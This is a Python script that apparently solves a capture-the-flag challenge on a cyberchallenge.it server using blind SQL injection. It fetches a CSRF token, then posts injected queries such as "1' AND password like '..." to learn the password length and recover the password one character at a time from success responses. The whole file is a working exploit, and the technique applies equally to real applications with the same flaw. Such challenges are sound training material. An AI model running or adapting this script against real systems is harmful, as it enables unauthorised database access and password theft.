import requests
import string

base_url = "http://sqlinjection.challs.cyberchallenge.it/"
csrf_path = "/api/get_token"
path = "/api/blind"
alphabet = string.digits + string.ascii_lowercase + string.ascii_uppercase

def get_csrf(session):
    token = session.get(base_url + csrf_path)
    token = token.json()
    token = token['token']
    return token

def send_query(session, query, csrf_token):
    headers = {'X-CSRFToken': csrf_token}
    data = {'query':query}
    req = session.post(base_url + path, headers=headers, json=data)
    response = req.json()
    return response 
    


if __name__ == "__main__":
    
    # start session and get scrf
    session = requests.Session()
    csrf_token = get_csrf(session)
    
    # get psw length
    length = 1
    password = "_"
    query = f"1' AND password like '{password}"
    response = send_query(session, query, csrf_token)
    result = response['result']

    while result != "Success":
        length = length +1
        password = length * "_"
        query = f"1' AND password like '{password}"
        response = send_query(session, query, csrf_token)
        result = response['result']

    print(f"length: {length}")
    
    # get password
    password = ""
    while len(password)<length:
        for c in alphabet:
            psw = password + c + (length - len(password)-1) * "_"
            query = f"1' AND password like '{psw}"
            response = send_query(session, query, csrf_token)
            result = response['result']
            print(f"\nquery: {response['query']}\nresult: {response['result']}\nerror: {response['sql_error']}\n")
            if result == 'Success':
                password = password + c
                break
